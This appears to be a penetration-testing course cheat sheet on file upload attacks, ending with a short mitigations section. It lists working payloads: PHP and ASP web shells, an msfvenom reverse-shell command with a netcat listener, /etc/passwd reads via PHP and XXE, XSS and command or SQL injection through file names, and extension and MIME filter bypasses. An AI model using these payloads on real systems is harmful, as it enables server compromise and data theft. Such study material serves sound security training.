# File Upload Attacks

## 🎯 Main Idea
- Insecure file upload lets attackers store malicious files on the server; the worst case is unauthenticated arbitrary file upload leading to remote code execution.
- Primary goal: upload a web shell or reverse shell in the web app's language to gain command execution.
- Even "limited" uploads (images, SVG, XML, docs) can introduce XSS, XXE/SSRF, and DoS.
- Weak extension/content filters (client-side, blacklist, whitelist, type checks) are all bypassable.

## 💥 Attack / Exploit Vectors

### Absent Validation (Arbitrary Upload)
- No back-end validation: upload a script in the server's language directly and visit it.
- Identify framework first (page extension, `/index.ext` fuzzing, Wappalyzer, scanners).
- **Commands**
  - `<?php echo "Hello HTB";?>` — test PHP execution (test.php)
  - `<?php echo file_get_contents('/etc/passwd'); ?>` — basic PHP file read
  - `<?php system('hostname'); ?>` — basic PHP command execution

### Upload Exploitation (Shells)
- Upload a web shell or reverse shell, then interact via browser / netcat listener.
- **Commands**
  - `<?php system($_REQUEST['cmd']); ?>` — custom PHP web shell (call with `?cmd=id`)
  - `<% eval request('cmd') %>` — basic ASP/.NET web shell
  - phpbash / SecLists Web-Shells / pentestmonkey php-reverse-shell — ready-made shells
  - `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` — generate PHP reverse shell
  - `nc -lvnp OUR_PORT` — start listener for reverse shell
  - Tip: view web-shell output via source-view `[CTRL+U]`

### Client-Side Validation Bypass
- Validation only in front-end JS; bypass by modifying the request or the page code.
- **Commands**
  - Burp: change `filename="HTB.png"` → `shell.php` and swap file content to a web shell
  - `[CTRL+SHIFT+C]` — toggle Page Inspector to remove `onchange="checkFile(this)"` / `accept` attribute
  - `[CTRL+SHIFT+K]` — Console to inspect the `checkFile()` validation function

### Blacklist Filter Bypass
- Back-end blocks a list of extensions; use non-listed or case-varied extensions.
- **Commands**
  - `shell.phtml` — uncommon PHP extension (also `.php7`, `.phar`, `.php5`, etc.)
  - `shell.pHp` — case manipulation (bypasses case-sensitive blacklist)
  - Fuzz extensions with Burp Intruder + PayloadsAllTheThings PHP/ASP list or SecLists web-extensions
  - PHP/ASP/Web extension wordlists — for fuzzing allowed extensions

### Whitelist Filter Bypass
- Weak regex checks that filename *contains* (not *ends with*) an allowed extension.
- **Commands**
  - `shell.jpg.php` — double extension (allowed ext not at end)
  - `shell.php.jpg` — reverse double extension (exploits Apache `FilesMatch` misconfig `.+\.ph(ar|p|tml)` without `$`)
  - Character injection before/after extension: `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`
  - `shell.php%00.jpg` — null-byte (PHP <= 5.x)
  - `shell.aspx:.jpg` — colon injection (Windows)
  - Bash loop to generate char-injection permutations wordlist, then fuzz with Intruder

### Content/Type Filter Bypass
- Server validates Content-Type header or MIME-type (magic bytes); spoof both.
- **Commands**
  - Change file Content-Type header to `image/jpg` (fuzz with SecLists content-types list)
  - `echo "GIF8" > text.jpg` / prepend `GIF8` to PHP payload — spoof GIF magic bytes (`mime_content_type`)
  - `file text.jpg` — verify perceived MIME type
  - Combine allowed MIME + disallowed extension (and permutations) to confuse filters

### Limited File Uploads (secondary vulns)
- When only specific types allowed, abuse them for other attacks.
- **Commands**
  - `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg` — XSS in image metadata
  - SVG with `<script>alert(window.origin);</script>` — Stored XSS; HTML upload = XSS/CSRF
  - `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>` — XXE file read
  - `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">` — XXE source-code read
  - DoS: ZIP decompression bomb, JPG/PNG pixel flood (`0xffff x 0xffff`), oversized file, traversal `../../../etc/passwd`

### Other Upload Attacks
- Abuse the file name itself and processing logic.
- **Commands**
  - `file$(whoami).jpg` / `` file`whoami`.jpg `` / `file.jpg||whoami` — command injection via filename
  - `<script>alert(window.origin);</script>` as filename — XSS via filename
  - `file';select+sleep(5);--.jpg` — SQLi via filename
  - Upload directory disclosure: duplicate/overlong names, forced errors
  - Windows: reserved chars (`| < > * ?`), reserved names (`CON`, `COM1`, `LPT1`, `NUL`), 8.3 convention (`WEB~1.CON`)
  - Advanced: library exploits (e.g. AVI→XXE in `ffmpeg`)

## 🛠️ Key Tools & Concepts
- Burp Suite (Repeater/Intruder) — intercept, modify, and fuzz upload requests
- Wappalyzer / web scanners — fingerprint back-end language/framework
- SecLists & PayloadsAllTheThings — web shells, extension & content-type wordlists
- exiftool — inject payloads into image metadata
- msfvenom — generate reverse shell scripts in many languages
- File Signatures / Magic Bytes (e.g. `GIF8`), MIME-type (`mime_content_type`)

## 🛡️ Mitigations
- Validate extensions with BOTH whitelist (ends-with, anchored `$`) and blacklist, on front-end AND back-end
- Validate file content: file signature + Content-Type, and ensure both match the extension
- Hide uploads directory; serve via `download.php` with authz + path validation; `403` direct access
- Use `Content-Disposition: attachment`, correct `Content-Type`, `X-Content-Type-Options: nosniff`
- Randomize stored filenames, store sanitized original in DB; separate upload server/container; `open_basedir`
- Disable dangerous PHP functions (`exec`, `shell_exec`, `system`, `passthru`), hide errors, limit size, update libraries, scan files, use a WAF
